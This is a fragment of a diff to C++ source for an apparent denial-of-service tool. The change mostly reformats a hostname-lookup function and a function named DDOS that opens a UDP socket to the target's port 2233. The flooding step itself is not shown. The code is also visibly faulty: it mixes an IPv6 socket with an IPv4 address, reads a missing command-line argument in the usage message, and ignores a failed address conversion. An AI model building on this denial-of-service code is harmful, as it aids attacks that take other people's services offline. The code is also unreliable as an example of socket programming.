@@ -9,10 +9,9 @@ using namespace std;
 const char * getIPadress(int argc, char* argv[]){
     if(argc != 2)
     {
-        printf("usage: %s <hostname>\n", argv[0], argv[1]);
+        printf("usage: %s%s <hostname>\n", argv[0], argv[1]);
         exit(1);
     }
-
     hostent * record = gethostbyname(argv[1]);
     if(record == NULL)
     {
@@ -27,15 +26,14 @@ const char * getIPadress(int argc, char* argv[]){
 void DDOS(const char *ip_adress){
     cout << "Ip adress: "<< ip_adress << endl;
     struct sockaddr_in server ;
-    struct addrinfo addr; char host_buf[NI_MAXHOST];
     int sd = socket (AF_INET6,SOCK_DGRAM,0);
     if( sd == -1 ) {
         sd = errno;
         printf("Error: %s\n", strerror(sd));
     }
     memset(&server, 0, sizeof( server ));
-    server . sin_family = AF_INET;
-    server .sin_port = htons(2233);
+    server.sin_family = AF_INET;
+    server.sin_port = htons(2233);
     if ( inet_aton(ip_adress, &server.sin_addr) <= 0 ) {}
     int con = connect(sd, (const sockaddr *) &server, sizeof(server));
     if( con == -1){
